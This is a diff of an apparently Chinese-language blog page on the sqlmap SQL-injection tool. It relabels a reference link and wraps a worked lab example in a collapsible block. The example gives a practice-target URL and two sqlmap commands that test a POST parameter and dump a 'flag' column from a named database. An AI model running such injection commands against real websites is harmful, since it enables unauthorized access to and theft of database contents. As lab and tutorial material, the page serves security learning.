@@ -225,7 +225,7 @@
             <h1 style="display: none">Sqlmap</h1>
             
             <div class="markdown-body" id="post-body">
-              <p>官方文档参考：<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></p>
+              <p>【参考文档】<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></p>
 <a id="more"></a>
 
 <h2 id="0x001-用法参考"><a href="#0x001-用法参考" class="headerlink" title="0x001 用法参考"></a>0x001 用法参考</h2><pre><code class="hljs"><span class="hljs-attribute">Usage</span>: python sqlmap.py [options]
@@ -529,9 +529,14 @@
 <td align="left">–proxy=”<a href="http://127.0.0.1:8087&quot;">http://127.0.0.1:8087&quot;</a></td>
 </tr>
 </tbody></table>
-<h2 id="0x003-实例使用"><a href="#0x003-实例使用" class="headerlink" title="0x003 实例使用"></a>0x003 实例使用</h2><h3 id="实例001"><a href="#实例001" class="headerlink" title="实例001"></a>实例001</h3><p>网址：<a target="_blank" rel="noopener" href="https://rimovni.exeye.run/hugkudure/well">https://rimovni.exeye.run/hugkudure/well</a><br>使用命令：</p>
+<h2 id="0x003-实例使用"><a href="#0x003-实例使用" class="headerlink" title="0x003 实例使用"></a>0x003 实例使用</h2><details>
+<summary>Demo 001</summary>
+靶机网址：
+<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>rimovni.exeye.run<span class="hljs-regexp">/hugkudure/</span>well</code></pre>
+使用命令：
 <pre><code class="hljs routeros">python sqlmap.py -u <span class="hljs-string">&quot;https://rimovni.exeye.run/hugkudure/well&quot;</span> <span class="hljs-attribute">--method</span>=POST <span class="hljs-attribute">--data</span>=<span class="hljs-string">&quot;name=1&quot;</span>
 python sqlmap.py -u <span class="hljs-string">&quot;https://rimovni.exeye.run/hugkudure/well&quot;</span> <span class="hljs-attribute">--method</span>=POST <span class="hljs-attribute">--data</span>=<span class="hljs-string">&quot;name=1&quot;</span> -D twosecu1_vuln_06 -T flag -C flag --dump</code></pre>
+</details>
 
             </div>
             <hr>
